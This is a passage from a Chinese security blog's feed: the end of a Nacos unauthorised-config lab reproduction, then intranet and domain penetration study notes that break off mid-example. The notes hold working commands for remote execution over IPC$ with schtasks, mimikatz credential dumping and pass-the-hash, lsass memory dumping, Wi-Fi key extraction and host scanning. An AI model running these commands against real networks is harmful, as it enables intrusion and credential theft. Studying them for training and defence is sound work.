class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;namespaceShowName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;quota&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;configCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="读取配置文件"><a class="markdownIt-Anchor" href="#读取配置文件"></a> 读取配置文件</h2><p>使用apipost，设置Host为Nacos-Server，发送GET请求：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span></span><br><span class="line"># or</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span></span><br><span class="line"># or导出</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;totalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pagesAvailable&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pageItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;639026079587323904&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flag&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DEFAULT_GROUP&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8948791476&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tenant&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;appName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基本信息&quot;&gt;&lt;/a&gt; 基本信息&lt;/h1&gt;
&lt;p&gt;使用的是在线靶场：&lt;a href=&quot;https://hack.zkaq.cn/battle/target?id=1496966ab0</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/26/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-26T02:32:30.000Z</published>
    <updated>2023-07-05T02:32:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.png" alt="内网安全" /></p><h2 id="名词"><a class="markdownIt-Anchor" href="#名词"></a> 名词</h2><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36352d312e706e67.png" alt="65-1" /></p><h3 id="dmz"><a class="markdownIt-Anchor" href="#dmz"></a> DMZ</h3><p>英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</p><p>一般我们攻击web都是DMZ中的服务器，我们如果要获取更加多的敏感信息，需要进一步进行内网攻击。因为一般敏感信息都做了隔离。</p><h3 id="局域网内网"><a class="markdownIt-Anchor" href="#局域网内网"></a> 局域网/内网</h3><p>局域网就是内部网，局域网内部的电脑共用与外部的物理连接</p><h3 id="工作组"><a class="markdownIt-Anchor" href="#工作组"></a> 工作组</h3><p>工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是<strong>将不同的电脑按功能分别列入不同的组中，以方便管理</strong>。它是<strong>最常见最简单最普通的资源管理模式</strong>，就是<strong>将不同的电脑按功能分别列入不同的组中，以方便管理。</strong></p><p>相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是Users目录。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用。工作组里的所有计算机都是对等的 , 也就是没有服务器和客户机之分的。</p><h3 id="域"><a class="markdownIt-Anchor" href="#域"></a> 域</h3><p>这是一个有安全边界计算机组合（一个域用户没办法访问另一个与用户的资源），域内资源统一由域控制器DC集中管理（通过组策略管理），用户名和密码都是放在域控制器去验证的。</p><h4 id="域控dc"><a class="markdownIt-Anchor" href="#域控dc"></a> 域控DC</h4><p><strong>域控制器</strong>(Domain Controller，DC)是一台<strong>安装并运行Active Directory的服务器</strong>，它包含Active  Directory数据库的可写副本，参与Active Directory复制并控制对网络资源的访问。控制器统一管理帐户数据库、所有的用户登录、资源访问认证及其管理任务。一个域可以有一个或多个域控制器，各域控制器间地位平等，管理员可以在任一台域控制器上更新域中的信息，更新的信息会自动传递到网络中的其他域控制器中。</p><h4 id="活动目录adactivity-dictionary与ntdsdit数据库"><a class="markdownIt-Anchor" href="#活动目录adactivity-dictionary与ntdsdit数据库"></a> 活动目录AD（activity dictionary）与NTDS.dit数据库</h4><p><strong>活动目录</strong>AD是域环境中提供目录服务的组件。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。<strong>安装有AD活动目录的服务器就是域控DC。</strong></p><p>在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。</p><p>域用户帐户以域数据库的形式保存在活动目录中，<strong>NTDS.dit是活动目录的数据库文件</strong>，该文件记录的信息有以下三张表：</p><ul><li><strong>Schema 表</strong> ：这个表中包含了所有可在活动目录创建的对象信息以及他们之间的相互关系。包括各种类型对象的可选及不可选的各种属性。这个表是活动目录数据库中最小的一个表，但是也是最基础的一个表。</li><li><strong>Link 表</strong> ：Link表包含所有属性的关联，包括活动目录中所有对象的属性的值。一个用户对象的所有属性的类型，包括每个属性的值及用户所属于的组等信息都属于这个表。这个表要大于Schema 表，但与Data 表相比要小。</li><li><strong>Data 表</strong>：活动目录中用户，组，应用程序特殊数据和其他的数据全部保存在Data表中。这是活动目录中存储信息最多的一个表，大量的活动目录的资料实际上还是存储在这个表中。</li></ul><h4 id="ntdsutilexe"><a class="markdownIt-Anchor" href="#ntdsutilexe"></a> Ntdsutil.exe</h4><p>ntdsutil.exe是域控制器自带的<strong>域数据库管理工具</strong>，从windows Server 2008 开始就默认自带了。因此我们<strong>可以通过ntdsutil.exe提取出域中所有的域用户信息。</strong></p><h4 id="域的架构"><a class="markdownIt-Anchor" href="#域的架构"></a> 域的架构</h4><p>单域/域树…</p><h2 id="技术与认证"><a class="markdownIt-Anchor" href="#技术与认证"></a> 技术与认证</h2><h3 id="ipc连接"><a class="markdownIt-Anchor" href="#ipc连接"></a> IPC连接</h3><p>IPC(Internet Process Connection)是共享&quot;命名管道&quot;的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p>建立连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.100\ipc$ <span class="string">&quot;password&quot;</span> /user:<span class="string">&quot;administrator&quot;</span> <span class="comment"># 工作组</span></span><br><span class="line">net use \\192.168.0.100\ipc$<span class="string">&quot;password&quot;</span> /user:domain\username <span class="comment">#域内</span></span><br></pre></td></tr></table></figure><p>传输文件：假如我要传的文件是putty.exe，admin$表示C:\WINDOWS\目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy putty.exe \\192.168.0.100\admin$</span><br></pre></td></tr></table></figure><p>定时执行命令：（CMD）中间的19.45是时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.0.100    <span class="comment"># 查看时间</span></span><br><span class="line">at \\192.168.0.100 19:45 putty.exe <span class="comment"># at指令是win2012之前的</span></span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.3.32 /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /sc DAILY /tr c:\add.bat /F  <span class="comment">#创建 adduser 任务，schtasks &gt;=Windows2012</span></span><br><span class="line"></span><br><span class="line">schtasks /create /s 192.168.93.30 /ru <span class="string">&quot;SYSTEM&quot;</span> /tn t4801 /sc MINUTE /tr 4801.exe /F</span><br><span class="line">schtasks /run /s 192.168.93.30 /tn t4801 /i</span><br><span class="line"></span><br><span class="line">schtasks /run /s 192.168.3.32 /tn adduser /i <span class="comment">#运行 adduser 任务</span></span><br><span class="line">schtasks /delete /s 192.168.3.21 /tn adduser /f<span class="comment">#删除 adduser 任务</span></span><br></pre></td></tr></table></figure><p>磁盘映射与文件操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use Z: \\192.168.0.100\c$ <span class="comment">#映射对方的磁盘C到我们这Z盘</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \xx.xx.xx.xx\C$\ <span class="comment"># 查看文件列表</span></span><br><span class="line">net use \xx.xx.xx.xx\C$\1.bat /del <span class="comment"># 删除</span></span><br><span class="line">net view xx.xx.xx.xx <span class="comment"># 查看对方共享</span></span><br></pre></td></tr></table></figure><p>断开：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.0.100 /del</span><br></pre></td></tr></table></figure><h4 id="常见的错误代码"><a class="markdownIt-Anchor" href="#常见的错误代码"></a> 常见的错误代码</h4><ul><li>5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</li><li>51：网络问题，Windows 无法找到网络路径</li><li>53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</li><li>67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 <code>ipc$</code></li><li>1219：提供的凭据和已存在的凭据集冲突，说明已建立<code> IPC$</code>，需要先删除</li><li>1326：账号密码错误</li><li>1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</li><li>2242：用户密码过期，目标有账号策略，强制定期更改密码</li></ul><h4 id="失败连接的原因"><a class="markdownIt-Anchor" href="#失败连接的原因"></a> 失败连接的原因</h4><ol><li>目标系统不是 NT 或以上的操作系统</li><li>对方没有打开 IPC$共享</li><li>对方未开启 139、445 端口，或者被防火墙屏蔽</li><li>输出命令、输入账号密码有错误</li></ol><h3 id="ldap连接"><a class="markdownIt-Anchor" href="#ldap连接"></a> LDAP连接</h3><p>这个是基于LINUX的类似共享的机制（差不多是像win的域一样）</p><h3 id="lmntlmwin-hash加密算法"><a class="markdownIt-Anchor" href="#lmntlmwin-hash加密算法"></a> LM&amp;NTLM——Win-hash加密算法</h3><p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p><p>NTLM协议具有许多漏洞，可以被中间人攻击、哈希转储攻击、零日漏洞攻击与弱密码攻击等方式利用，虽然因为这些漏洞，许多大企业均采用其他更加安全的协议进行认证（如<strong>Kerberos、OAuth2.0</strong>等），但是很多小企业内网均还使用这种认证方式登录</p><h3 id="wmi"><a class="markdownIt-Anchor" href="#wmi"></a> WMI</h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。<strong>而且整个运行过程都在计算机内存中发生，不会留下任何痕迹</strong>。这一点是其它渗透测试工具所不能相比的。</p><p>参考：<a href="https://www.cnblogs.com/-qing-/p/10661480.html">https://www.cnblogs.com/-qing-/p/10661480.html</a></p><h3 id="kerberos协议"><a class="markdownIt-Anchor" href="#kerberos协议"></a> Kerberos协议</h3><p>具体工作方法，在域中，简要介绍一下：</p><ul><li>客户机将明文密码进行 NTLM 哈希,然后<strong>和时间戳</strong>一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)</li><li>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据</li><li>然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测。</li><li>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。</li></ul><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230629111115012.png" alt="image-20230629111115012" /></p><p>简单来说：</p><ol><li>用户向域控请求TGT票据令牌</li><li>用户向域控请求服务授权票据</li><li>用户拿票据请求服务</li></ol><h4 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h4><p>仿造TGT票据可以获取任意Kerberos的访问权限，由KRBTGT NTLM Hash加密，同KDC交互但不同AS交互。</p><h4 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h4><p>仿造TGS票据只能访问指定的服务如CIFS，由服务账号NTLM Hash加密，不同KDC交互直接访问Server。</p><h4 id="区别"><a class="markdownIt-Anchor" href="#区别"></a> 区别</h4><h2 id="认知"><a class="markdownIt-Anchor" href="#认知"></a> 认知</h2><h3 id="linux能否进行域渗透"><a class="markdownIt-Anchor" href="#linux能否进行域渗透"></a> Linux能否进行域渗透</h3><ul><li>Q：AD域控制器只在windows server系统能做吗？Linux可以？</li><li>A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企业很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</li></ul><h3 id="局域网渗透技术与域渗透技术"><a class="markdownIt-Anchor" href="#局域网渗透技术与域渗透技术"></a> 局域网渗透技术与域渗透技术</h3><p>不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</p><h3 id="工作组和域的区别"><a class="markdownIt-Anchor" href="#工作组和域的区别"></a> 工作组和域的区别</h3><ul><li>工作组：地位平等，管理分散，没有集中管理。</li><li>域环境：地位不平等，管理集中，实现集中管理。</li><li>域环境也可以简单的理解为工作组的升级版，更好管理。</li><li>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</li></ul><h1 id="基本信息搜集"><a class="markdownIt-Anchor" href="#基本信息搜集"></a> 基本信息搜集</h1><h2 id="主机服务信息"><a class="markdownIt-Anchor" href="#主机服务信息"></a> 主机&amp;服务信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">net start 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br></pre></td></tr></table></figure><p>探针域内主机角色及服务信息</p><ul><li>利用开放端口服务及计算机名判断</li><li>核心业务机器：<ul><li>1.高级管理人员，系统管理员，财务/人事、业务人员的个人计算机</li><li>2.产品管理系统服务器</li><li>3.办公系统服务器</li><li>4.财务应用系统服务器</li><li>5.核心产品源码服务器</li><li>6.数据库服务器</li><li>7.文件或者网盘服务器</li><li>8.电子邮件服务器</li><li>9.网络监控系统服务器</li><li>10.其他服务器（内部技术文档服务器，其他监控服务器）</li></ul></li></ul><h2 id="网络信息"><a class="markdownIt-Anchor" href="#网络信息"></a> 网络信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all     判断存在域-dns</span><br><span class="line">net view /domain  判断存在域</span><br><span class="line">net time /domain  判断主域</span><br><span class="line">netstat -ano      当前网络端口开放</span><br><span class="line">nslookup     域名 追踪来源地址</span><br></pre></td></tr></table></figure><h3 id="判断存在域"><a class="markdownIt-Anchor" href="#判断存在域"></a> 判断存在域</h3><h4 id="dns后缀"><a class="markdownIt-Anchor" href="#dns后缀"></a> dns后缀</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>不存在域，则没有东西</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626160854405.png" alt="image-20230626160854405" /></p><p>存在域</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626160912551.png" alt="image-20230626160912551" /></p><h4 id="net-view与net-time查看域与主域"><a class="markdownIt-Anchor" href="#net-view与net-time查看域与主域"></a> net view与net time查看域与主域</h4><p><code>net view /domain</code>是判断是否存在域</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626161203266.png" alt="image-20230626161203266" style="zoom: 80%;" /><p><code>net time /domain</code>是判断主域</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230626161229177.png" alt="image-20230626161229177" style="zoom: 80%;" /><h4 id="域控ip反查"><a class="markdownIt-Anchor" href="#域控ip反查"></a> 域控IP反查</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;域控制器全名&gt;  </span><br><span class="line">ping &lt;域控制器全名&gt;  </span><br></pre></td></tr></table></figure><h2 id="用户信息搜集"><a class="markdownIt-Anchor" href="#用户信息搜集"></a> 用户信息搜集</h2><h3 id="系统默认常见用户身份"><a class="markdownIt-Anchor" href="#系统默认常见用户身份"></a> 系统默认常见用户身份</h3><ul><li>Domain Admins：域管理员（默认对域控制器有完全控制权）</li><li>Domain Computers：域内机器</li><li>Domain Controllers：域控制器</li><li>Domain Guest：域访客，权限低</li><li>Domain Users：域用户</li><li>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</li></ul><p>我们主要攻击<strong>Domain Admains</strong>和<strong>Enterprise Admains</strong> 大部分成员主机在 Domain Users 域用户里</p><h3 id="相关用户搜集"><a class="markdownIt-Anchor" href="#相关用户搜集"></a> 相关用户搜集</h3><ul><li><code>whoami /all</code> 用户权限</li><li><code>net config workstation</code> 登录信息</li><li><code>net user</code> 本地用户</li><li><code>net localgroup</code> 本地用户组</li><li><code>net user /domain</code> 获取域用户信息</li><li><code>net group /domain</code> 获取域用户组信息</li><li><code>wmic useraccount get /all</code> 涉及域用户详细信息</li><li><code>net group &quot;Domain Admins&quot; /domain</code> 查询域管理员账户</li><li><code>net group &quot;Enterprise Admins&quot; /domain</code> 查询管理员用户组</li><li><code>net group &quot;Domain Controllers&quot; /domain</code> 查询域控制器</li></ul><h3 id="涉及域用户详细信息"><a class="markdownIt-Anchor" href="#涉及域用户详细信息"></a> 涉及域用户详细信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><h2 id="凭据信息搜集"><a class="markdownIt-Anchor" href="#凭据信息搜集"></a> 凭据信息搜集</h2><p>旨在<strong>收集各种密文，明文，口令</strong>等，为后续<strong>横向渗透</strong>做好测试准备，包括</p><ul><li><p>计算机用户HASH</p></li><li><p>明文获取</p><ul><li><p><a href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>(win)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">log</span><br><span class="line"># 初始化</span><br><span class="line">privilege ::debug</span><br><span class="line"># 抓取内存中的凭证</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"># 导出凭证</span><br><span class="line">sekurlsa::tickets /export</span><br><span class="line"># 进行PTH传递</span><br><span class="line">sekurlsa::pth /user:Administrateur /domain:god.org/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd</span><br></pre></td></tr></table></figure><p>如果mimikatz被杀了，那么可以使用<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a>把内存先dump下来，然后再下载到本地，在本地使用Mimikatz来解析！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="comment"># mimikatz</span></span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li><li><p>kivi（msf集成）</p></li><li><p><a href="https://github.com/huntergregal/mimipenguin/releases/">mimipenguin</a>(linux)</p></li></ul></li><li><p>计算机各种协议服务口令获取</p><ul><li><p><a href="https://github.com/AlessandroZ/LaZagne/releases/">LaZagne</a>(all)</p></li><li><p><a href="https://xenarmor.com/allinone-password-recovery-pro-software">XenArmor</a>(win)</p><p>这两个软件主要是通过自动化翻找以下内容，从而获取凭据。</p><ul><li>1.站点源码备份文件，数据库备份文件等</li><li>2.各类数据库WEB管理入口，如PHPmyadmin</li><li>3.浏览器保存密码，浏览器cookies</li><li>4.其他用户会话，3389和ipc$连接记录，回收站内容</li><li>5.windows 保存的WIFI密码</li><li>6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</li></ul></li><li><p><code>Netsh WLAN show profiles </code></p></li><li><p><code>Netsh WLAN show profile name=&quot;无线名称&quot; key=clear</code></p></li></ul></li></ul><h2 id="探寻域控架构存活主机探测"><a class="markdownIt-Anchor" href="#探寻域控架构存活主机探测"></a> 探寻域控架构——存活主机探测</h2><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><p>nbtscan工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan 192.168.3.0/24 </span><br></pre></td></tr></table></figure><p>自带内部命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr <span class="string">&quot;TTL=&quot;</span> </span><br></pre></td></tr></table></figure><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><h3 id="nishang"><a class="markdownIt-Anchor" href="#nishang"></a> NiShang</h3><p><a href="https://github.com/samratashok/nishang">NiShang</a>：利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，它集成了框架、脚本和各种payload。</p><p>导入模块 nishang</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\nishang.psm1</span><br></pre></td></tr></table></figure><p>设置执行策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure><p>获取模块 nishang 的命令函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Command -Module nishang</span><br></pre></td></tr></table></figure><p>获取常规计算机信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Information</span><br></pre></td></tr></table></figure><p>端口扫描（查看目录对应文件有演示语法，其他同理）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 192.168.80.0 -EndAddress 192.168.80.100 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure><p>其他功能：删除补丁，反弹 Shell，凭据获取等</p><h3 id="impacket"><a class="markdownIt-Anchor" href="#impacket"></a> Impacket</h3><p>Impacket工具包介绍：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p><p>impacket工具包下载，可下载exe版本：</p><ul><li><a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></li><li><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li></ul><h3 id="ladon"><a class="markdownIt-Anchor" href="#ladon"></a> Ladon</h3><p><strong>国产Ladon内网杀器测试验收</strong></p><p>信息收集-协议扫描-漏洞探针-传递攻击等</p><p>官网：<a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p><p>具体用法请查看官网wiki，举例如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫当前机器所处C段的存活主机，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 OnlinePC </span><br><span class="line"><span class="comment"># 扫当前机器所处C段操作系统版本，其它模块同理</span></span><br><span class="line">Ladon.exe 192.168.1.8/24 OsScan </span><br><span class="line"><span class="comment"># 